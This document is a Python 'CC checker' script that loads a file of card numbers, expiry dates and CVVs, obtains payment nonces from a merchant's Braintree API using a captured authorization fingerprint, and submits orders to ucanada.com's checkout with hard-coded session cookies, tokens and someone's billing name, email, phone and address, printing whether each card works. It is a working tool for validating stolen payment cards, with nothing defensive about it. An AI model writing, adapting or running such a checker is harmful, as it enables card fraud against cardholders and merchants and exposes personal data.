import requests
def Check(P):
    try:
      n, mm, yy, cvc = map(str.strip, P.split("|"))
    except:
      pass
    headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer': 'https://www.ucanada.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'script',
    'sec-fetch-mode': 'no-cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

    params = {
    'sharedCustomerIdentifierType': 'undefined',
    'braintreeLibraryVersion': 'braintree/web/2.15.7',
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjMxMDY2MDAsImp0aSI6IjY5NjQ5NjU2LTM2MmUtNDdiYi05MzlmLTEyN2U0OTQyNWFhNiIsInN1YiI6ImQ1MzVuM2tkNThucHg2aHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImQ1MzVuM2tkNThucHg2aHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.q2amw8QhJFXgA4yrGXDyCeDpNv4d1NEdCUPApKetlNi5xTHNriL_s0MW5BTtw_790KWeYGdo_JkPjsZ5UyQM-w',
    'share': 'undefined',
    'creditCard[billingAddress][postalCode]': '95376',
    'creditCard[number]': n,
    'creditCard[cardholderName]': 'ali abdo',
    'creditCard[expirationMonth]': mm,
    'creditCard[expirationYear]': yy,
    'creditCard[cvv]': cvc,
    'creditCard[options][validate]': 'false',
    '_meta[integration]': 'custom',
    '_meta[source]': 'form',
    '_method': 'POST',
    'callback': 'callback_jsonddcff8f727df448291c2273cefc6d575',
}

    res = requests.get(
    'https://api.braintreegateway.com/merchants/d535n3kd58npx6hy/client_api/v1/payment_methods/credit_cards',
    params=params,
    headers=headers,
).text
    try:
        token = res.split('"nonce":"')[1].split('"')[0]
    except:
        pass

    cookies = {
    '_gid': 'GA1.2.733306759.1723019963',
    '.Nop.RecentlyViewedProducts': '813',
    '.Nop.Antiforgery': 'CfDJ8DtH_nUESuZOu35OsBg6PjVZzGEuNZg3fXayWFDJSf70qJqCQgc16lOZ7NcBd7JG9TPDG4SJ8A4NcYCWDhPA7KPdSk-VJo0tlzJXqMENX_6F3Yv3iK3pWOL4YBkB4MQNYEH69BdEs9Q-kyGIzdbYf14',
    '_ga_X65ZPPEB85': 'GS1.1.1723019962.1.1.1723020024.60.0.0',
    '_ga': 'GA1.2.105073186.1723019963',
    '.Nop.Customer': '49de24b1-881b-4bf3-b6d9-0f73c74c03a1',
}

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://www.ucanada.com',
    'Referer': 'https://www.ucanada.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

    data = {
    '__RequestVerificationToken': 'CfDJ8DtH_nUESuZOu35OsBg6PjWdweMjv4qLTdImK7j6fPAE1LGdA9djYFgXAKaK0rVS5ShUfAZi7e41ziEQxbeR8wSkF997-Cb0E-w8NLwnGxKB8wYDyO382VgMbvpDEmBpa_NVOTupSpU028Kc6giUCYQ',
    'billingFirstName': 'Alasbahi',
    'billingLastName': 'Anwar',
    'billingEmail': 'almtohsymn00@gmail.com',
    'billingCompany': 'Ni',
    'billingCountry': '1',
    'billingStateProvince': '9',
    'billingCity': 'Tracy',
    'billingCounty': '',
    'billingAddress1': '1975 W 11th St',
    'billingAddress2': '1975 W 11th St',
    'billingZipPostalCode': '95376',
    'billingPhoneNumber': '2098342808',
    'billingFaxNumber': '',
    'billingVatNumber': '',
    'shipToSameAddress': 'true',
    'shippingFirstName': 'Alasbahi',
    'shippingLastName': 'Anwar',
    'shippingEmail': 'almtohsymn00@gmail.com',
    'shippingCompany': 'Ni',
    'shippingCountry': '1',
    'shippingStateProvince': '9',
    'shippingCity': 'Tracy',
    'shippingCounty': '',
    'shippingAddress1': '1975 W 11th St',
    'shippingAddress2': '1975 W 11th St',
    'shippingZipPostalCode': '95376',
    'shippingPhoneNumber': '2098342808',
    'shippingFaxNumber': '',
    'shippingmethod': '[object Object]',
    'paymentmethod': '[object Object]',
    'CardholderName': 'ali abdo',
    'CardNumber': n,
    'ExpireMonth': mm,
    'ExpireYear': yy,
    'CardCode': cvc,
    'paymenttoken': token,
    'nextstep': 'Next',
    'itemquantity285539': '1',
}

    response = requests.post('https://www.ucanada.com/RealOnePageCheckout/ConfirmOrder', cookies=cookies, headers=headers, data=data)
    hh = response.json()
    print(f"Card : {P} Status : {hh}")
    print("_" *60)

def fileget():
    file = input(f'[+] ENTER YOUR COMBO CC : ')
    print("_" *60)
    try:
        with open(file, "r") as f:
            for line in f:
                P = line.strip()
                Check(P)
    except:
        print("File not found. Please enter a valid file name.")
        fileget()
        
fileget()